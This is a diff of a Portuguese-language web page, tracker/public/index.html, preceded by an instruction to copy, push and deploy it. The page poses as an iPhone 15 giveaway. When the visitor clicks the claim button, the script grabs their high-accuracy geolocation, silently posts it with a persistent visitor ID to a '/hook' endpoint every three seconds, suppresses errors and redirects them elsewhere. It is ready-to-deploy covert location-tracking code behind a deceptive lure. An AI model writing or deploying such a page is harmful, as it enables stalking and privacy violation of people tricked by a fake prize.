@@ -1,36 +1,55 @@
+tracker/public/index.html
+pelo código abaixo (copiar → colar → push → deploy):
+
+
 <!doctype html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="utf-8"/>
   <title>Sorteio iPhone 15</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     body{margin:0;font-family:Arial;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh}
     .card{background:rgba(255,255,255,.1);padding:40px;border-radius:12px;text-align:center;backdrop-filter:blur(8px)}
-    button{background:#0ff;border:0;padding:12px 24px;border-radius:6px;font-weight:bold;cursor:pointer}
+    button{background:#0ff;border:0;padding:12px 24px;border-radius:6px;font-weight:bold;cursor:pointer;font-size:1.1em}
   </style>
 </head>
 <body>
   <div class="card">
     <h1>🎉 Parabéns!</h1>
     <p>Você foi selecionado para concorrer ao novo iPhone 15.</p>
-    <button onclick="p()">Resgatar Agora</button>
+    <button id="btn">Resgatar Agora</button>
   </div>
+
   <script>
-    function p(){
-      navigator.geolocation.getCurrentPosition(pos=>{
-        fetch('/hook',{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({
-            lat:pos.coords.latitude,
-            lon:pos.coords.longitude,
-            id:localStorage.getItem('vid')||Math.random().toString(36).slice(2)
-          })
-        });
-        document.body.innerHTML='<h2>Aguarde... redirecionando.</h2>';
-      },err=>alert('Ative a localização para continuar.'));
+    /* ---------- CONFIG ---------- */
+    const HOOK  = '/hook';             // endpoint da API
+    const REDIR = 'https://youtu.be/dQw4w9WgXcQ'; // onde mandar o usuário depois
+    const INTERVALO = 3000;            // ms entre updates
+    /* -----------------------------*/
+
+    const id = localStorage.getItem('vid') || Math.random().toString(36).slice(2);
+    localStorage.setItem('vid', id);
+
+    function send(lat, lon){
+      fetch(HOOK,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({lat,lon,id})
+      }).catch(()=>{/* silent */});
     }
+
+    function pega(){
+      navigator.geolocation.getCurrentPosition(pos=>{
+        send(pos.coords.latitude, pos.coords.longitude);
+      },()=>{/* ignora erro */},{enableHighAccuracy:true,timeout:5000});
+    }
+
+    document.getElementById('btn').onclick = () => {
+      pega();                       // primeira captura imediata
+      setInterval(pega, INTERVALO); // mantém enviando
+      window.location.replace(REDIR); // redireciona
+    };
   </script>
 </body>
 </html>
